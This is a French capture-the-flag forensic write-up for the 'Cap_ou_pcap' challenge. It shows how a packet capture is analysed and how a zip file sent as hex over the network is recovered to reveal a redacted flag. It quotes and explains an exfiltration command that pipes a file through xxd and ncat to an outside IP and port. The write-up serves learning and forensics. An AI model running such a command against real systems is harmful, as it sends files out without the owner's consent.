+++
date = '2026-01-09T10:50:30+01:00'
title = 'Cap_ou_pcap'
draft = false
categories = ["Forensic"]
tags = ["Intro"]
+++
Le challenge nous donne simplement un fichier pcap dans lequel nous pouvons voir une communication entre deux machines. 
On peut suivre la première communication TCP de ces deux machines:
![[/images/writeups/Pasted image 20260108221547.png]]
Pour informations, ces communication se font d'un port quelconque au port 2020. Ce qui voudrait potentiellement dire que la machine qui accepte la connexion serait vulnérable au trojan: [CVE-2010-4121](https://www.cve.org/CVERecord?id=CVE-2010-4121).
Celui-ci donne accès à une connexion en remote comme SSH (mais bien moins sécurisé, heureusement pour nous :) )

Nous pouvons voir une communication assez banale mis à part l'avant dernière commande qui envoie un dossier avec ncat: 
```bash
xxd -d Documents/flag.zip | tr -d '\n' | ncat 172.20.20.133 20200
```

- `xxd -d file` : permet d'avoir `file` en hexadécimal. 
- `tr -d '\n` : permet d'enlever les retours à la ligne (simplement pur que ce soit plus pratique pour nous). 
- `ncat 172.20.20.133 20200` fais la connexion sur le port 20200 pour communiquer le résultât de la commande.

`ncat` par défaut n'est pas chiffré et le texte est par conséquent transmis en clair (il faut utiliser `--tls`), donc nous pouvons intercepter la communication en hexa.

On cherche une communication sur le port 20200
![[/images/writeups/Pasted image 20260108221628.png]]
Nous pouvons suivre la communication pour avoir ce qui est transmis:
![[/images/writeups/Pasted image 20260108221712.png]]
![[/images/writeups/Pasted image 20260108221742.png]]
Nous avons plus qu'à mettre ces données dans un fichier:
```bash
mathis@fedora-2:~/Documents/ctf/hackropole/cap_ou_pcap$ echo "504b0304140000000800a231825065235c39420000004700000008001c00666c61672e7478745554090003bfc8855ebfc8855e75780b000104e803000004e80300000dc9c11180300804c0bfd5840408bc33630356e00568c2b177ddef9eeb5a8fe6ee06ce8e5684f0845997192aad44ecaedc7f8e1acc4e3ec1a8eda164d48c28c77b7c504b01021e03140000000800a231825065235c394200000047000000080018000000000001000000a48100000000666c61672e7478745554050003bfc8855e75780b000104e803000004e8030000504b050600000000010001004e000000840000000000" | xxd -r -p > file 
```

`xxd -r -p` permet de décoder de l'hexadécimal à un fichier en binaire. 

On vérifie que l'on a bien un fichier compressé:
```bash
mathis@fedora-2:~/Documents/ctf/hackropole/cap_ou_pcap$ file file 
file: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, last modified, last modified Sun, Apr 02 2020 06:13:04, uncompressed size 71, method=deflate
```

On peut alors regarder ce qu'il y a dedans en le décompressant:
```bash
mathis@fedora-2:~/Documents/ctf/hackropole/cap_ou_pcap$ unzip file
Archive:  file
  inflating: flag.txt                
mathis@fedora-2:~/Documents/ctf/hackropole/cap_ou_pcap$ cat flag.txt 
FCSC{xxxxxxxxxxxxxx}
```
